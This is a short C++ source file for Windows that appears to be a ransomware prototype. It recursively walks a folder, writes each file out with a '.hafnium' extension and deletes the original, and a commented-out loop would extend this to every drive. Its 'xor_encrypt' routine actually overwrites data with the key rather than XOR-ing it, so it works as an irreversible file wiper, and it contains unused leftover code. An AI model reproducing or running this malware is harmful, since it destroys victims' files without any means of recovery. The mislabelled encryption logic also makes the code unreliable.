#include <iostream>
#include <windows.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <random>


namespace fs = std::filesystem;

size_t WriteCallBack(char* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}


void xor_encrypt(std::string path) {
    char key[65] = "098f6bcd4621d373cade4e832627b4f6098f6bcd4621d373cade4e832627b4";
    std::ifstream input{ path,std::ios::binary };
    std::ofstream output{ path + ".hafnium", std::ios::binary };

    char buffer[64];
    
    while (!input.eof()) {
        input.read(buffer, 64);
        for (size_t i = 0; i < 64; i++) {
            buffer[i] = key[i];
        }
        output.write(buffer, input.gcount());
    }
    input.close();
    std::remove(path.c_str());
}


std::vector < std::string> getDrives()
{
    std::vector < std::string> Drives;

    std::random_device rd{};
    std::string num = std::to_string(rd());


    char* lDrives = new char[MAX_PATH]();
    if (GetLogicalDriveStringsA(MAX_PATH, lDrives)) 
    {
        for (int i = 0; i < 100; i+=4)
        {
            if (lDrives[i] != (char)0)
            {
                Drives.push_back(std::string{ lDrives[i], lDrives[i + 1], lDrives[i + 2], lDrives[i + 3]});
            }
        }
    }
    delete[] lDrives;
    return Drives;
}

int main()
{
    std::vector<std::string> lecteurs = getDrives();
    /*
    for (auto lec : lecteurs) // If you run this loop, you risk digitizing all your disks
    {
    */
        for (auto& fichier : fs::recursive_directory_iterator("D:\\test", fs::directory_options::skip_permission_denied))
        {
            try 
            {
                if (fs::is_directory(fichier))
                {

                }
                else 
                {
                    xor_encrypt(fichier.path().string());
                    // std::cout << fichier.path().string() << std::endl;
                }
            }
            catch (const std::exception&) {

            }
        }
        /*
        // std::cout << lec << std::endl;
    }
*/
}
